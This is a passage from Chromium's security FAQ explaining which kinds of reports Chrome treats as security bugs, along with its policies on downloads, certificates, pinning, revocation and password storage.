The [file type policy](https://source.chromium.org/chromium/chromium/src/%2B/main%3Acomponents/safe_browsing/content/resources/download_file_types.asciipb?q=download_file_types.asciipb%20-f:%2Fgen%2F&ss=chromium) controls some details of which security checks to enable for a given file extension. Most importantly, it controls whether we contact Safe Browsing about a download, and whether we show a warning for all downloads of that file type. Starting in M74, the default for unknown file types has been to contact Safe Browsing. This prevents large-scale abuse from a previously unknown file type. Starting in M105, showing a warning for all downloads of an extension became reserved for exceptionally dangerous file types that can compromise a user without any user interaction with the file (e.g. DLL hijacking). If you discover a new file type that meets that condition, we’d like to hear about it.

### I found a local file or directory that may be security-sensitive and is not blocked by File System Access API - is this a security bug?

The File System Access API maintains a [blocklist](https://source.chromium.org/chromium/chromium/src/%2B/main%3Achrome/browser/file_system_access/chrome_file_system_access_permission_context.cc;l=266-346) of directories and files that may be sensitive such as systems file, and if user chooses a file or a directory matching the list on a site using File System Access API, the access is blocked.

The blocklist is designed to help mitigate accidental granting by users by listing well-known, security-sensitive locations, as a defense in-depth strategy. Therefore, the blocklist coverage is not deemed as a security bug, especially as it requires user's explicit selection on a file or a directory from the file picker.

### I can download a file with an unsafe extension but a different extension or file type is shown to the user - is this a security bug?

See [file types](#TOC-The-wrong-description-for-a-file-type-is-added-by-Chrome-).

### Extensions for downloaded files are not shown in a file dialog - is this a security bug?

See [file types](#TOC-The-wrong-description-for-a-file-type-is-added-by-Chrome-).

### The wrong description for a file type is added by Chrome - is this a security bug?

Chrome tries to let users know what they will be saving and downloading before they do so. Often operating systems will obscure a file’s type or extension and there is little we can do about that. Chrome shows information to help users make these decisions, both in Chrome-owned UI and in information that Chrome passes to OS-owned UI. If this information can be manipulated from a web site to mislead a user, then we’d like to hear about it. [Example](https://crbug.com/1137247).

### I can download a file and OS indicators for its provenance are not applied - is this a security bug?

Chrome attempts to label files downloaded from the internet with metadata using operating system APIs where these are available – for instance applying the Mark of the Web on Windows. This is often not possible (for instance on non-NTFS file systems on Windows, or for files inside downloaded archives) or disabled by policy. If a web site can cause Chrome to download a file without Chrome then adding this metadata as usual, we’d like to hear about it.

### I can cause a hard or soft link to be written to a directory bypassing normal OS blocks - is this a security bug?

Chrome should not allow filesystem links to be created by initiating a download. [Example](https://crbug.com/1140417). [Example](https://crbug.com/1137247#c12).

### I can hijack a user gesture and trick a user into accepting a permission or downloading a file - is this a security bug?

Chrome tries to design its prompts to select safe defaults. If a prompt can accidentally be accepted without the user having an opportunity to make a decision about the prompt then we’d like to know. Examples might include poor defaults so that a user holding down an enter key might accept a dialog they would want to dismiss. [Example](https://crbug.com/854455#c11).

Note that a user navigating to a download will cause a file to be [downloaded](https://crbug.com/1114592).

### Sandbox/CSP/etc... security properties are not inherited when navigating using the middle-click/contextual-menu - is this a security bug?

The security properties of the document providing the URL are not used/inherited when the user deliberately opens a link in a popup using one of:

* Ctrl + left-click (Open link in new tab)
* Shift + left-click (Open link in new window)
* Middle-click (Open a link in a new tab)
* Right-click > “Open link in ...”

These methods of following a link have more or less the same implications as the user copying the link's URL and pasting it into a newly-opened window. We treat them as user-initiated top-level navigations, and as such will not apply or inherit policy restrictions into the new context

Example of security related properties:

* Content-Security-Policy
* Cross-Origin-Embedder-Policy
* Cross-Origin-Opener-Policy
* Origin
* Referrer
* Sandbox
* etc...

These browser's actions/shortcuts are specific to Chrome. They are different from the behavior specified by the web-platform, such as using executing `window.open()` or opening a link with the `target=_blank` attribute.

### What is the threat model for Chrome for Testing?

[Chrome for Testing](https://developer.chrome.com/blog/chrome-for-testing) is a distribution of current and older versions of Chrome. It does not auto-update. Therefore, it may lack recent fixes for security bugs. Security bugs can more easily be exploited once their fixes are [published in the main Chromium source code repository](/chromium/src/%2B/refs/heads/main/docs/security/updates.md) and so it is unsafe to use Chrome for Testing to access any untrusted website. You should use Chrome for Testing only for browser automation and testing purposes, consuming only trustworthy content. `chrome-headless-shell` also lacks auto-updates and so, for the same reason, should only be used to consume trusted content.

## Areas outside Chrome's Threat Model

### Are privacy issues considered security bugs?

No. The Chrome Privacy team treats privacy issues, such as leaking information from Incognito, fingerprinting, and bugs related to deleting browsing data as functional bugs.

Privacy issues are not considered under the security vulnerability rewards program; the [severity guidelines](/chromium/src/%2B/refs/heads/main/docs/security/severity-guidelines.md) outline the types of bugs that are considered security vulnerabilities in more detail.

### What are the security and privacy guarantees of Incognito mode?

Bugs in Incognito mode are tracked as privacy bugs, not security bugs.

The [Help Center](https://support.google.com/chrome/?p=cpn_incognito) explains what privacy protections Incognito mode attempts to enforce. In particular, please note that Incognito is not a “do not track” mode, and it does not hide aspects of your identity from web sites. Chrome does offer a way to send Do Not Track request to servers; see [chrome://settings/?search=do+not+track](/chromium/src/%2B/refs/heads/main/docs/security/chrome%3A//settings/%3Fsearch%3Ddo%2Bnot%2Btrack)

When in Incognito mode, Chrome does not store any new history, cookies, or other state in non-volatile storage. However, Incognito windows will be able to access some previously-stored state, such as browsing history.

### Are XSS filter bypasses considered security bugs?

No. Chromium once contained a reflected XSS filter called the [XSSAuditor](https://www.chromium.org/developers/design-documents/xss-auditor) that was a best-effort second line of defense against reflected XSS flaws found in web sites. The XSS Auditor was [removed in Chrome 78](https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/TuYw-EZhO9g/blGViehIAwAJ). Consequently, Chromium no longer takes any special action in response to an X-XSS-Protection header.

### Are denial of service issues considered security bugs?

No. Denial of Service (DoS) issues are treated as **abuse** or **stability** issues rather than security vulnerabilities.

* If you find a reproducible crash (e.g. a way to hit a `CHECK`), we encourage you to [report it](https://issues.chromium.org/new).
* If you find a site that is abusing the user experience (e.g. preventing you from leaving a site), we encourage you to [report it](https://issues.chromium.org/new).

DoS issues are not considered under the security vulnerability rewards program; the [severity guidelines](/chromium/src/%2B/refs/heads/main/docs/security/severity-guidelines.md) outline the types of bugs that are considered security vulnerabilities in more detail.

### Why aren‘t physically-local attacks in Chrome’s threat model?

People sometimes report that they can compromise Chrome by installing a malicious DLL in a place where Chrome will load it, by hooking APIs (e.g. [Issue 130284](https://crbug.com/130284)), or by otherwise altering the configuration of the device.

We consider these attacks outside Chrome's threat model, because there is no way for Chrome (or any application) to defend against a malicious user who has managed to log into your device as you, or who can run software with the privileges of your operating system user account. Such an attacker can modify executables and DLLs, change environment variables like `PATH`, change configuration files, read any data your user account owns, email it to themselves, and so on. Such an attacker has total control over your device, and nothing Chrome can do would provide a serious guarantee of defense. This problem is not special to Chrome ­— all applications must trust the physically-local user.

There are a few things you can do to mitigate risks from people who have physical control over **your** computer, in certain circumstances.

* To stop people from reading your data in cases of device theft or loss, use full disk encryption (FDE). FDE is a standard feature of most operating systems, including Windows Vista and later, Mac OS X Lion and later, and some distributions of Linux. (Some older versions of Mac OS X had partial disk encryption: they could encrypt the user’s home folder, which contains the bulk of a user’s sensitive data.) Some FDE systems allow you to use multiple sources of key material, such as the combination of both a password and a key file on a USB token. When available, you should use multiple sources of key material to achieve the strongest defense. Chrome OS encrypts users’ home directories.
* If you share your computer with other people, take advantage of your operating system’s ability to manage multiple login accounts, and use a distinct account for each person. For guests, Chrome OS has a built-in Guest account for this purpose.
* Take advantage of your operating system’s screen lock feature.
* You can reduce the amount of information (including credentials like cookies and passwords) that Chrome will store locally by using Chrome's Content Settings ([chrome://settings/content](/chromium/src/%2B/refs/heads/main/docs/security/chrome%3A//settings/content)) and turning off the form auto-fill and password storage features ([chrome://settings/search#password](/chromium/src/%2B/refs/heads/main/docs/security/chrome%3A//settings/search#password)).

There is almost nothing you can do to mitigate risks when using a **public** computer.

* Assume everything you do on a public computer will become, well, public. You have no control over the operating system or other software on the machine, and there is no reason to trust the integrity of it.
* If you must use such a computer, use Incognito mode and close all Incognito windows when you are done browsing to limit the amount of data you leave behind. Note that Incognito mode **provides no protection** if the system has already been compromised as described above.

### Why aren‘t compromised/infected machines in Chrome’s threat model?

Although the attacker may now be remote, the consequences are essentially the same as with physically-local attacks. The attacker's code, when it runs as your user account on your machine, can do anything you can do. (See also [Microsoft's Ten Immutable Laws Of Security](https://web.archive.org/web/20160311224620/https%3A//technet.microsoft.com/en-us/library/hh278941.aspx).)

Other cases covered by this section include leaving a debugger port open to the world, remote shells, and so forth.

### If a website can open an Android app via an intent is this a security bug?

No - websites can link to external handlers or applications - but there are restrictions around requiring a user gesture and the type of intent that can be launched. Full details are available in the [external\_intents](/chromium/src/%2B/refs/heads/main/components/external_intents/README.md) documentation.

### Does entering JavaScript: URLs in the URL bar or running script in the developer tools mean there's an XSS vulnerability?

[No](https://crbug.com/81697). Chrome does not attempt to prevent the user from knowingly running script against loaded documents, either by entering script in the Developer Tools console or by typing a JavaScript: URI into the URL bar. Chrome and other browsers do undertake some efforts to prevent *paste* of script URLs in the URL bar (to limit [social-engineering](https://blogs.msdn.microsoft.com/ieinternals/2011/05/19/socially-engineered-xss-attacks/)) but users are otherwise free to invoke script against pages using either the URL bar or the DevTools console.

### Does executing JavaScript from a bookmark or the Home button mean there's an XSS vulnerability?

No. Chromium allows users to create bookmarks to JavaScript URLs that will run on the currently-loaded page when the user clicks the bookmark; these are called [bookmarklets](https://en.wikipedia.org/wiki/Bookmarklet).

Similarly, the Home button may be configured to invoke a JavaScript URL when clicked.

### Does executing JavaScript in a PDF file mean there's an XSS vulnerability?

No. PDF files have the ability to run JavaScript, usually to facilitate field validation during form fill-out. Note that the set of bindings provided to the PDF are more limited than those provided by the DOM to HTML documents, nor do PDFs get any ambient authority based upon the domain from which they are served (e.g. no document.cookie).

### Are PDF files static content in Chromium?

No. PDF files have some powerful capabilities including invoking printing or posting form data. To mitigate abuse of these capabiliies, such as beaconing upon document open, we require interaction with the document (a “user gesture”) before allowing their use.

### Are non-committed URLs entered by the user considered URL spoofs?

No. When a user enters a URL into the address bar (whether by typing, copy/pasting, drag and drop, or otherwise), Chrome intentionally displays it instead of the last committed URL of the currently active page, until both the navigation begins and the new page commits. During this time, the currently active page can change its appearance to mimic the new URL while its own URL is not shown. However, the active page does not have control over which URL the user entered into the address bar, limiting the effectiveness of a spoof attempt. The new [lock-replacement icon](https://blog.chromium.org/2023/05/an-update-on-lock-icon.html) is also not present in this state, and in many cases (i.e., once the new navigation has started), the loading indicators are present.

The confusion between the non-committed URL and the active page's appearance is a consequence of the address bar needing to serve two roles: showing both where you are and where you are going.

See also <https://crbug.com/378932942> for context.

### What about URL spoofs using Internationalized Domain Names (IDN)?

We try to balance the needs of our international userbase while protecting users against confusable homograph attacks. Despite this, there are a list of known IDN display issues we are still working on.

* Please see [this document](https://docs.google.com/document/d/1_xJz3J9kkAPwk3pma6K3X12SyPTyyaJDSCxTfF8Y5sU) for a list of known issues and how we handle them.
* [This document](https://chromium.googlesource.com/chromium/src/%2B/main/docs/idn.md) describes Chrome's IDN policy in detail.

### Chrome silently syncs extensions across devices. Is this a security vulnerability?

This topic has been moved to the [Extensions Security FAQ](https://chromium.googlesource.com/chromium/src/%2B/main/extensions/docs/security_faq.md).

### Why aren't null pointer dereferences considered security bugs?

Null pointer dereferences with consistent, small, fixed offsets are not considered security bugs. A read or write to the NULL page results in a non-exploitable crash. If the offset is larger than 32KB, or if there's uncertainty about whether the offset is controllable, it is considered a security bug.

All supported Chrome platforms do not allow mapping memory in at least the first 32KB of address space:

* Windows: Windows 8 and later disable mapping the first 64k of address space; see page 33 of [Exploit Mitigation Improvements in Windows 8](https://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf) [[archived]](https://web.archive.org/web/20230608131033/https%3A//media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf).
* Mac and iOS: by default, the linker reserves the first 4GB of address space with the `__PAGEZERO` segment for 64-bit binaries.
* Linux: the default `mmap_min_addr` value for supported distributions is at least 64KB.
* Android: [CTS](https://android.googlesource.com/platform/cts/%2B/496152a250d10e629d31ac90b2e828ad77b8d70a/tests/tests/security/src/android/security/cts/KernelSettingsTest.java#43) enforces that `mmap_min_addr` is set to exactly 32KB.
* ChromeOS: the [ChromeOS kernels](https://source.chromium.org/search?q=%22CONFIG_DEFAULT_MMAP_MIN_ADDR%3D%22%20path:chromeos%2F&ss=chromiumos%2Fchromiumos%2Fcodesearch:src%2Fthird_party%2Fkernel%2F) set the default `mmap_min_addr` value to at least 32KB.
* Fuchsia: the [userspace base address](https://cs.opensource.google/fuchsia/fuchsia/%2B/main%3Azircon/kernel/arch/arm64/include/arch/kernel_aspace.h;l=20;drc=eeceea01eee2615de74b1339bcf6e6c2c6f72769) begins at 2MB; this is configured per-platform but set to the same value on all platforms.

### Indexing a container out of bounds hits a \_\_libcpp\_verbose\_abort, is this a security bug?

`std::vector` and other containers are now protected by libc++ hardening on all platforms [crbug.com/1335422](https://crbug.com/1335422). Indexing these containers out of bounds is now a safe crash - if a proof-of-concept reliably causes a crash in production builds we consider these to be functional rather than security issues.

### Are stack overflows considered security bugs?

No. Guard pages mean that stack overflows are considered unexploitable, and are regarded as [denial of service bugs](#TOC-Are-denial-of-service-issues-considered-security-bugs-). The only exception is if an attacker can jump over the guard pages allocated by the operating system and avoid accessing them, e.g.:

* A frame with a very large stack allocation.
* C variable length array with an attacker-controlled size.
* A call to `alloca()` with an attacker-controlled size.

### Are tint shader compiler Internal Compiler Errors considered security bugs?

No. When tint fails and throws an ICE (Internal Compiler Error), it will terminate the process in an intentional manner and produce no shader output. Thus there is not security bug that follows from it.

### Are enterprise admins considered privileged?

Chrome [can't guard against local attacks](#TOC-Why-aren-t-physically-local-attacks-in-Chrome-s-threat-model-). Enterprise administrators often have full control over the device. Does Chrome assume that enterprise administrators are as privileged and powerful as other local users? It depends:

* On a fully managed machine, for example a [domain-joined Windows machine](https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/join-a-computer-to-a-domain), a device managed via a Mobile Device Management product, or a device with Chrome managed via machine-level [Chrome Browser Cloud Management](https://support.google.com/chrome/?p=cloud_management), the administrator effectively has privileges to view and mutate any state on the device. Chrome [policy implementations](/chromium/src/%2B/refs/heads/main/docs/enterprise/add_new_policy.md) should still guide enterprise admins to the most user-respectful defaults and policy description text should clearly describe the nature of the capabilities and the user impact of them being granted.
* On an unmanaged machine, Chrome profiles [can be managed via cloud policy](https://support.google.com/chrome/?p=manage_profiles) if users sign into Chrome using a managed account. These policies are called *user policies*. In this scenario, the Chrome enterprise administrator should have privileges only to *view and mutate state within the profile that they administer*. Any access outside that profile requires end-user consent.

Chrome administrators can force-install Chrome extensions without permissions prompts, so the same restrictions must apply to the Chrome extension APIs.

Chrome has a long history of policy support with many hundreds of policies. We recognize that there may exist policies or policy combinations that can provide capabilities outside of the guidance provided here. In cases of clear violation of user expectations, we will attempt to remedy these policies and we will apply the guidance laid out in this document to any newly added policies.

See the [Web Platform Security guidelines](https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/web-platform-security-guidelines.md#enterprise-policies) for more information on how enterprise policies should interact with Web Platform APIs.

### Can I use EMET to help protect Chrome against attack on Microsoft Windows?

There are [known compatibility problems](https://sites.google.com/a/chromium.org/dev/Home/chromium-security/chromium-and-emet) between Microsoft's EMET anti-exploit toolkit and some versions of Chrome. These can prevent Chrome from running in some configurations. Moreover, the Chrome security team does not recommend the use of EMET with Chrome because its most important security benefits are redundant with or superseded by built-in attack mitigations within the browser. For users, the very marginal security benefit is not usually a good trade-off for the compatibility issues and performance degradation the toolkit can cause.

### Dangling pointers

Chromium can be instrumented to detect [dangling pointers](https://chromium.googlesource.com/chromium/src/%2B/main/docs/dangling_ptr.md):

Notable build flags are:

* `enable_dangling_raw_ptr_checks=true`
* `use_raw_ptr_asan_unowned_impl=true`

Notable runtime flags are:

* `--enable-features=PartitionAllocDanglingPtr`

It is important to note that detecting a dangling pointer alone does not necessarily indicate a security vulnerability. A dangling pointer becomes a security vulnerability only when it is dereferenced and used after it becomes dangling.

In general, dangling pointer issues should be assigned to feature teams as ordinary bugs and be fixed by them. However, they can be considered only if there is a demonstrable way to show a memory corruption. e.g. with a POC causing crash with ASAN **without the flags above**.

## Certificates & Connection Indicators

### Where are the security indicators located in the browser window?

The topmost portion of the browser window, consisting of the **Omnibox** (or **Location Bar**), navigation icons, menu icon, and other indicator icons, is sometimes called the browser **chrome** (not to be confused with the Chrome Browser itself). Actual security indicators can only appear in this section of the window. There can be no trustworthy security indicators elsewhere.

Furthermore, Chrome can only guarantee that it is correctly representing URLs and their origins at the end of all navigation. Quirks of URL parsing, HTTP redirection, and so on are not security concerns unless Chrome is misrepresenting a URL or origin after navigation has completed.

Browsers present a dilemma to the user since the output is a combination of information coming from both trustworthy sources (the browser itself) and untrustworthy sources (the web page), and the untrustworthy sources are allowed virtually unlimited control over graphical presentation. The only restriction on the page's presentation is that it is confined to the large rectangular area directly underneath the chrome, called the **viewport**. Things like hover text and URL preview(s), shown in the viewport, are entirely under the control of the web page itself. They have no guaranteed meaning, and function only as the page desires. This can be even more confusing when pages load content that looks like chrome. For example, many pages load images of locks, which look similar to the meaningful HTTPS lock in the Omnibox, but in fact do not convey any meaningful information about the transport security of that page.

When the browser needs to show trustworthy information, such as the bubble resulting from a click on the lock icon, it does so by making the bubble overlap chrome. This visual detail can't be imitated by the page itself since the page is confined to the viewport.

### Why does Chrome show a lock, even if my HTTPS connection is being proxied?

Some types of software intercept HTTPS connections. Examples include anti-virus software, corporate network monitoring tools, and school censorship software. In order for the interception to work, you need to install a private trust anchor (root certificate) onto your computer. This may have happened when you installed your anti-virus software, or when your company's network administrator set up your computer. If that has occurred, your HTTPS connections can be viewed or modified by the software.

Since you have allowed the trust anchor to be installed onto your computer, Chrome assumes that you have consented to HTTPS interception. Anyone who can add a trust anchor to your computer can make other changes to your computer, too, including changing Chrome. (See also [Why aren‘t physically-local attacks in Chrome’s threat model?](#TOC-Why-aren-t-physically-local-attacks-in-Chrome-s-threat-model-).)

### Why can’t I select Proceed Anyway on some HTTPS error screens?

A key guarantee of HTTPS is that Chrome can be relatively certain that it is connecting to the true web server and not an impostor. Some sites request an even higher degree of protection for their users (i.e. you): they assert to Chrome (via Strict Transport Security — [HSTS](https://tools.ietf.org/html/rfc6797) — or by other means) that any server authentication error should be fatal, and that Chrome must close the connection. If you encounter such a fatal error, it is likely that your network is under attack, or that there is a network misconfiguration that is indistinguishable from an attack.

The best thing you can do in this situation is to raise the issue to your network provider (or corporate IT department).

Chrome shows non-recoverable HTTPS errors only in cases where the true server has previously asked for this treatment, and when it can be relatively certain that the current server is not the true server.

### How does key pinning interact with local proxies and filters?

To enable certificate chain validation, Chrome has access to two stores of trust anchors (i.e., certificates that are empowered as issuers). One trust anchor store is for authenticating public internet servers, and depending on the version of Chrome being used and the platform it is running on, the [Chrome Root Store](https://chromium.googlesource.com/chromium/src/%2B/main/net/data/ssl/chrome_root_store/faq.md#what-is-the-chrome-root-store) might be in use. The private store contains certificates installed by the user or the administrator of the client machine. Private intranet servers should authenticate themselves with certificates issued by a private trust anchor.

Chrome’s key pinning feature is a strong form of web site authentication that requires a web server’s certificate chain not only to be valid and to chain to a known-good trust anchor, but also that at least one of the public keys in the certificate chain is known to be valid for the particular site the user is visiting. This is a good defense against the risk that any trust anchor can authenticate any web site, even if not intended by the site owner: if an otherwise-valid chain does not include a known pinned key (“pin”), Chrome will reject it because it was not issued in accordance with the site operator’s expectations.

Chrome does not perform pin validation when the certificate chain chains up to a private trust anchor. A key result of this policy is that private trust anchors can be used to proxy (or [MITM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)) connections, even to pinned sites. “Data loss prevention” appliances, firewalls, content filters, and malware can use this feature to defeat the protections of key pinning.

We deem this acceptable because the proxy or MITM can only be effective if the client machine has already been configured to trust the proxy’s issuing certificate — that is, the client is already under the control of the person who controls the proxy (e.g. the enterprise’s IT administrator). If the client does not trust the private trust anchor, the proxy’s attempt to mediate the connection will fail as it should.

### When is key pinning enabled?

Key pinning is enabled for Chrome-branded non-iOS builds when the local clock is within ten weeks of the embedded build timestamp. Key pinning is a useful security measure but it tightly couples client and server configurations and completely breaks when those configurations are out of sync. In order to manage that risk we need to ensure that we can promptly update pinning clients in an emergency and ensure that non-emergency changes can be deployed in a reasonable timeframe.

Each of the conditions listed above helps ensure those properties: Chrome-branded builds are those that Google provides and they all have an auto-update mechanism that can be used in an emergency. Even in cases where auto-update is generally effective, there are still non-trivial populations of stragglers for various reasons. The ten-week timeout prevents those stragglers from causing problems for regular, non-emergency changes and allows stuck users to still, for example, conduct searches and access Chrome's homepage to hopefully get unstuck.

In order to determine whether key pinning is active, try loading <https://pinning-test.badssl.com/>. If key pinning is active the load will *fail* with a pinning error.

### How does Certificate Transparency interact with local proxies and filters?

Just as [pinning only applies to publicly-trusted trust anchors](#TOC-How-does-key-pinning-interact-with-local-proxies-and-filters-), Chrome only evaluates Certificate Transparency (CT) for publicly-trusted trust anchors. Thus private trust anchors, such as for enterprise middle-boxes and AV proxies, do not need to be publicly logged in a CT log.

### Why are some web platform features only available in HTTPS page-loads?

The full answer is here: we [Prefer Secure Origins For Powerful New Features](https://www.chromium.org/Home/chromium-security/prefer-secure-origins-for-powerful-new-features). In short, many web platform features give web origins access to sensitive new sources of information, or significant power over a user's experience with their computer/phone/watch/etc., or over their experience with it. We would therefore like to have some basis to believe the origin meets a minimum bar for security, that the sensitive information is transported over the Internet in an authenticated and confidential way, and that users can make meaningful choices to trust or not trust a web origin.

Note that the reason we require secure origins for WebCrypto is slightly different: An application that uses WebCrypto is almost certainly using it to provide some kind of security guarantee (e.g. encrypted instant messages or email). However, unless the JavaScript was itself transported to the client securely, it cannot actually provide any guarantee. (After all, a MITM attacker could have modified the code, if it was not transported securely.)

See the [Web Platform Security guidelines](https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/web-platform-security-guidelines.md#encryption) for more information on security guidelines applicable to web platform APIs.

### Which origins are “secure”?

Secure origins are those that match at least one of the following (scheme, host, port) patterns:

* (https, \*, \*)
* (wss, \*, \*)
* (\*, localhost, \*)
* (\*, 127/8, \*)
* (\*, ::1/128, \*)
* (file, \*, —)
* (chrome-extension, \*, —)

That is, secure origins are those that load resources either from the local machine (necessarily trusted) or over the network from a cryptographically-authenticated server. See [Prefer Secure Origins For Powerful New Features](https://sites.google.com/a/chromium.org/dev/Home/chromium-security/prefer-secure-origins-for-powerful-new-features) for more details.

### What's the story with certificate revocation?

Chrome's primary mechanism for checking certificate revocation status is [CRLSets](https://dev.chromium.org/Home/chromium-security/crlsets). Additionally, by default, [stapled Online Certificate Status Protocol (OCSP) responses](https://en.wikipedia.org/wiki/OCSP_stapling) are honored.

As of 2024, Chrome enforces most security-relevant certificate revocations that are visible via Certificate Revocation Lists (CRLs) published to the [CCADB](https://www.ccadb.org/) via CRLSets. There is some inherent delay in getting revocation information to Chrome clients, but most revocations should reach most users within a few days of appearing on a CA's CRL.

Chrome clients do not, by default, perform “online” certificate revocation status checks using CRLs directly or via OCSP URLs included in certificates. This is because online checks offer limited security value unless a client, like Chrome, refuses to connect to a website if it cannot get a valid response,

Unfortunately, there are many widely-prevalent causes for why a client might be unable to get a valid certificate revocation status response to include:

* timeouts (e.g., an OCSP responder is online but does not respond within an acceptable time limit),
* availability issues (e.g., the OCSP responder is offline),
* invalid responses (e.g., a “stale” or malformed status response), and
* local network attacks misrouting traffic or blocking responses.

Additional concern with OCSP checks are related to privacy. OCSP requests reveal details of individuals' browsing history to the operator of the OCSP responder (i.e., a third party). These details can be exposed accidentally (e.g., via data breach of logs) or intentionally (e.g., via subpoena). Chrome used to perform revocation checks for Extended Validation certificates, but that behavior was disabled in 2022 for [privacy reasons](https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/S6A14e_X-T0/m/T4WxWgajAAAJ).

The following enterprise policies can be used to change the default revocation checking behavior in Chrome, though these may be removed in the future:

* [enable soft-fail OCSP](https://chromeenterprise.google/policies/#EnableOnlineRevocationChecks)
* [hard-fail for local trust anchors](https://chromeenterprise.google/policies/#RequireOnlineRevocationChecksForLocalAnchors).

## Passwords & Local Data

### What about unmasking of passwords with the developer tools?

One of the most frequent reports we receive is password disclosure using the Inspect Element feature (see [Issue 126398](https://crbug.com/126398) for an example). People reason that “If I can see the password, it must be a bug.” However, this is just one of the [physically-local attacks described in the previous section](#TOC-Why-aren-t-physically-local-attacks-in-Chrome-s-threat-model-), and all of those points apply here as well.

The reason the password is masked is only to prevent disclosure via “shoulder-surfing” (i.e. the passive viewing of your screen by nearby persons), not because it is a secret unknown to the browser. The browser knows the password at many layers, including JavaScript, developer tools, process memory, and so on. When you are physically local to the computer, and only when you are physically local to the computer, there are, and always will be, tools for extracting the password from any of these places.

### Is Chrome's support for userinfo in HTTP URLs (e.g. <http://user:password@example.com>) considered a vulnerability?

[Not at this time](https://crbug.com/626951). Chrome supports HTTP and HTTPS URIs with username and password information embedded within them for compatibility with sites that require this feature. Notably, Chrome will suppress display of the username and password information after navigation in the URL box to limit the effectiveness of spoofing attacks that may try to mislead the user. For instance, navigating to `http://trustedsite.com@evil.example.com` will show an address of `http://evil.example.com` after the page loads.

Note: We often receive reports calling this an “open redirect”. However, it has nothing to do with redirection; rather the format of URLs is complex and the userinfo may be misread as a host.

### Why does the Password Manager ignore `autocomplete='off'` for password fields?

Ignoring `autocomplete='off'` for password fields allows the password manager to give more power to users to manage their credentials on websites. It is the security team's view that this is very important for user security by allowing users to have unique and more complex passwords for websites. As it was originally implemented, autocomplete=‘off’ for password fields took control away from the user and gave control to the web site developer, which was also a violation of the [priority of constituencies](https://www.schemehostport.com/2011/10/priority-of-constituencies.html). For a longer discussion on this, see the [mailing list announcement](https://groups.google.com/a/chromium.org/forum/#!topic/chromium-dev/zhhj7hCip5c).

### Signing out of Chrome does not delete previously-synced data?

If you have signed into Chrome and subsequently sign out of Chrome, previously saved passwords and other data are not deleted from your device unless you select that option when signing out of Chrome.

If you change your Google password, synced data will no longer be updated in Chrome instances until you provide the new password to Chrome on each device configured to sync. However, previously synced data [remains available](https://crbug.com/792967) on each previously-syncing device unless manually removed.

### Why doesn't the Password Manager save my Google password if I am using Chrome Sync?

In its default mode, Chrome Sync uses your Google password to protect all the other passwords in the Chrome Password Manager.

In general, it is a bad idea to store the credential that protects an asset in the same place as the asset itself. An attacker who could temporarily compromise the Chrome Password Manager could, by stealing your Google password, obtain continuing access to all your passwords. Imagine you store your valuables in a safe, and you accidentally forget to close the safe. If a thief comes along, they might steal all of your valuables. That’s bad, but imagine if you had also left the combination to the safe inside as well. Now the bad guy has access to all of your valuables and all of your future valuables, too. The password manager is similar, except you probably would not even know if a bad guy accessed it.

To prevent this type of attack, Chrome Password Manager does not save the Google password for the account you sync with Chrome. If you have multiple Google accounts, the Chrome Password Manager will save the passwords for accounts other than the one you are syncing with.

### Does the Password Manager store my passwords encrypted on disk?

Chrome generally tries to use the operating system's user storage mechanism wherever possible and stores them encrypted on disk, but it is platform specific:

* On Windows, Chrome uses the [Data Protection API (DPAPI)](https://msdn.microsoft.com/en-us/library/ms995355.aspx) to bind your passwords to your user account and store them on disk encrypted with a key only accessible to processes running as the same logged on user.
* On macOS and iOS, Chrome previously stored credentials directly in the user‘s Keychain, but for technical reasons, it has switched to storing the credentials in “Login Data” in the Chrome users profile directory, but encrypted on disk with a key that is then stored in the user’s Keychain. See [Issue 466638](https://crbug.com/466638) and [Issue 520437](https://crbug.com/520437) for further explanation.
* On Linux, Chrome previously stored credentials directly in the user‘s Gnome Secret Service or KWallet, but for technical reasons, it has switched to storing the credentials in “Login Data” in the Chrome user’s profile directory, but encrypted on disk with a key that is then stored in the user's Gnome Secret Service or KWallet. If there is no available Secret Service or KWallet, the data is not encrypted when stored.
* On Android, Chrome doesn't store in the profile anymore, instead it uses Google Play Services to access passwords stored on a device.
* On ChromeOS passwords are only obfuscated since all profile data is encrypted by the OS.

### If there's a way to see stored passwords without entering a password, is this a security bug?

No. If an attacker has control of your login on your device, they can get to your passwords by inspecting Chrome disk files or memory. (See [why aren‘t physically-local attacks in Chrome’s threat model](#TOC-Why-aren-t-physically-local-attacks-in-Chrome-s-threat-model-)).

On some platforms we ask for a password before revealing stored passwords, but this is not considered a robust defense. It’s historically to stop users inadvertently revealing their passwords on screen, for example if they’re screen sharing. We don’t do this on all platforms because we consider such risks greater on some than on others.

### On some websites, I can use passkeys without passing a lock screen or biometric challenge. Is this a security bug?

Probably not. When a website requests a passkeys signature, it can choose whether the authenticator should perform user verification (e.g. with a local user lock screen challenge). Unless the website sets user verification parameter in the request to ‘required’, the passkey authenticator can choose to skip the lock screen challenge. Authenticators commonly skip an optional challenge if biometrics are unavailable (e.g. on a laptop with a closed lid).

If you can demonstrate bypassing the user verification challenge where the request user verification parameter is set to ‘required’, please [report it](https://issues.chromium.org/issues/new?noWizard=true&component=1363614&template=1922342).

## Other

### What is the security story for Service Workers?

See our dedicated [Service Worker Security FAQ](https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/service-worker-security-faq.md).

### What is the security story for Extensions?

See our dedicated [Extensions Security FAQ](https://chromium.googlesource.com/chromium/src/%2B/main/extensions/docs/security_faq.md).

### What's the security model for Chrome Custom Tabs?

See our [Chrome Custom Tabs security FAQ](/chromium/src/%2B/refs/heads/main/docs/security/custom-tabs-faq.md).

### How is security different in Chrome for iOS?

Chrome for iOS does not use Chrome‘s standard rendering engine. Due to Apple’s iOS platform restrictions, it instead uses Apple's WebKit engine and a more restricted process isolation model. This means its security properties are different from Chrome on all other platforms.

The differences in security are far too extensive to list exhaustively, but some notable points are:

* Chromium‘s [site isolation](https://www.chromium.org/Home/chromium-security/site-isolation/) isn’t used; WebKit has its own alternative implementation with different costs and benefits.
* WebKit has [historically been slower at shipping security fixes](https://googleprojectzero.blogspot.com/2022/02/a-walk-through-project-zero-metrics.html).
